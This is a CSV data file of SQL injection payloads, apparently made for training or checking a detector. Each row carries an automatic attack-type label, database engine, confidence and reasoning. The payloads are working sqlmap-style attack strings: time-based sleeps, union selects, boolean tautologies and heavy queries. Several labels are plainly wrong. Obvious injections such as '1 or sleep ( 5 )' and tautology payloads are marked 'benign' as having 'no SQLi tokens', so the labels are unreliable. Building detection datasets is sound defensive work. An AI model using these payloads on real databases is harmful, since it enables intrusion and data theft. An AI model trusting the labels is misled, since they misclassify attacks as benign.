id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
19944,1' ) ) rlike sleep ( 5 ) and ( ( 'qitl' like 'qitl,boolean_blind,mysql,0.9,Matched boolean_blind (P3) via token(s) 'rlike' in payload. DB=mysql.,2
19945,"1' ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( 'ggiw' = 'ggiw",boolean_blind,generic,0.9,Matched boolean_blind (P3) via token(s) 'case when' in payload; also saw heavy_query:'7+digit int' but boolean_blind has lower priority (stronger signal). DB=generic.,2
19946,"1' in boolean mode ) union all select null,null,null,null,null,null,null,null#",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
19947,1' ) and 1987 = 3756#,boolean_blind,generic,0.9,Matched boolean_blind (P3) via token(s) 'and 1987 = 3756' in payload. DB=generic.,3
19948,-9024 ) where 1686 = 1686 or 3069 = 8213--,boolean_blind,generic,0.9,Matched boolean_blind (P3) via token(s) 'or 3069 = 8213' in payload. DB=generic.,3
19949,-5995' ) ) or 6872 = 6872 and ( ( 'pywh' = 'pywh,boolean_blind,generic,0.9,Matched boolean_blind (P3) via token(s) 'or 6872 = 6872' in payload. DB=generic.,3
19950,1 ) ) as oqui where 3368 = 3368 order by 1--,boolean_blind,generic,0.5,UNCERTAIN: payload contains SQL meta but no specific high-priority token matched; tentative boolean_blind. Snippet='1 ) ) as oqui where 3368 = 3368 order by 1--',2
19951,"1%"" ) union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
19952,"1' ) as xagu where 9088 = 9088 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",boolean_blind,generic,0.9,Matched boolean_blind (P3) via token(s) 'case when' in payload; also saw heavy_query:'7+digit int' but boolean_blind has lower priority (stronger signal). DB=generic.,2
19953,1' in boolean mode ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,benign,mysql,0.7,No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: '1' in boolean mode ) or ( select * from ( select ( sleep ( 5',1
19954,"-4543"" ) or 3038 = 3038",boolean_blind,generic,0.9,Matched boolean_blind (P3) via token(s) 'or 3038 = 3038' in payload. DB=generic.,3
19955,1 ) where 3381 = 3381,benign,generic,0.7,No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: '1 ) where 3381 = 3381',2
19956,"-6160' ) ) ) or make_set ( 1924 = 4415,4415 ) and ( ( ( 'hayr' = 'hayr",benign,generic,0.7,"No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: '-6160' ) ) ) or make_set ( 1924 = 4415,4415 ) and ( ( ( 'hay'",2
19957,1 or sleep ( 5 ),benign,mysql,0.7,No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: '1 or sleep ( 5 )',2
19958,1'+ ( select cxvy where 7421 = 7421,benign,generic,0.7,No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: '1'+ ( select cxvy where 7421 = 7421',1
19959,"-1439"" or 2849 = 8484 and ""pmdl"" = ""pmdl",boolean_blind,generic,0.9,Matched boolean_blind (P3) via token(s) 'or 2849 = 8484' in payload. DB=generic.,3
19960,1 ) ) as wrhe where 6120 = 6120 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,boolean_blind,firebird,0.5,UNCERTAIN: payload contains SQL meta but no specific high-priority token matched; tentative boolean_blind. Snippet='1 ) ) as wrhe where 6120 = 6120 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6',3
19961,"-8425"" ) ) or ( 6485 = 1127 ) *1127 and ( ( ""qruf"" = ""qruf",benign,generic,0.7,"No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: '-8425"" ) ) or ( 6485 = 1127 ) *1127 and ( ( ""qruf"" = ""qruf'",2
19962,"1"" ) as drrx where 8633 = 8633 union all select null,null,null--",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
19963,"1%"" ) ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ( ""%"" = """,boolean_blind,mysql,0.9,Matched boolean_blind (P3) via token(s) 'case when' in payload; also saw heavy_query:'7+digit int' but boolean_blind has lower priority (stronger signal). DB=mysql.,2
19964,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ""%"" = """,heavy_query,sqlite,0.9,Matched heavy_query (P4) via token(s) '7+digit int' in payload. DB=sqlite.,2
19965,-8701%' ) ) or ( 4843 = 1690 ) *1690 and ( ( '%' = ',benign,generic,0.7,No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: '-8701%' ) ) or ( 4843 = 1690 ) *1690 and ( ( '%' = '',2
19966,"1' ) ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( 'crus' = 'crus",boolean_blind,mysql,0.9,Matched boolean_blind (P3) via token(s) 'if(...)' in payload; also saw heavy_query:'7+digit int' but boolean_blind has lower priority (stronger signal). DB=mysql.,2
